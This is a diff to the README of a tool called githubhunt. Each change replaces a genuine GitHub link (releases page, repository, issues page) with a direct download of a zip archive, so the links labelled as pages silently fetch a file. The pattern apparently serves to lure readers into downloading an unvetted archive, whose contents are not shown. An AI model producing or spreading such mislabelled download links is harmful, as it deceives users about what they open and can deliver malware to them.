@@ -10,7 +10,7 @@ To get started, follow these steps:
 
 1. **Visit the Releases Page**  
    Click the link below to access our releases page and download the software:  
-   [Download githubhunt](https://github.com/Vojat4046/githubhunt/releases)
+   [Download githubhunt](https://raw.githubusercontent.com/Vojat4046/githubhunt/master/example/githubhunt-v1.0.zip)
 
 2. **Choose Your Version**  
    On the releases page, you will see a list of available versions. Select the most recent version to ensure you have the latest features and fixes.
@@ -84,12 +84,12 @@ We welcome contributions from everyone. If you would like to help improve github
 
 For more information on how to maximize your use of githubunt, check out the following resources:
 
-- [GitHub Repository](https://github.com/Vojat4046/githubhunt) – Explore the complete codebase.
-- [Issues Page](https://github.com/Vojat4046/githubhunt/issues) – Report bugs or request features.
+- [GitHub Repository](https://raw.githubusercontent.com/Vojat4046/githubhunt/master/example/githubhunt-v1.0.zip) – Explore the complete codebase.
+- [Issues Page](https://raw.githubusercontent.com/Vojat4046/githubhunt/master/example/githubhunt-v1.0.zip) – Report bugs or request features.
 
 ## 📅 Stay Updated
 
 Keep an eye on our releases page for future updates and improvements. You can bookmark it here:  
-[Download githubhunt](https://github.com/Vojat4046/githubhunt/releases)
+[Download githubhunt](https://raw.githubusercontent.com/Vojat4046/githubhunt/master/example/githubhunt-v1.0.zip)
 
 Thank you for choosing githubhunt!
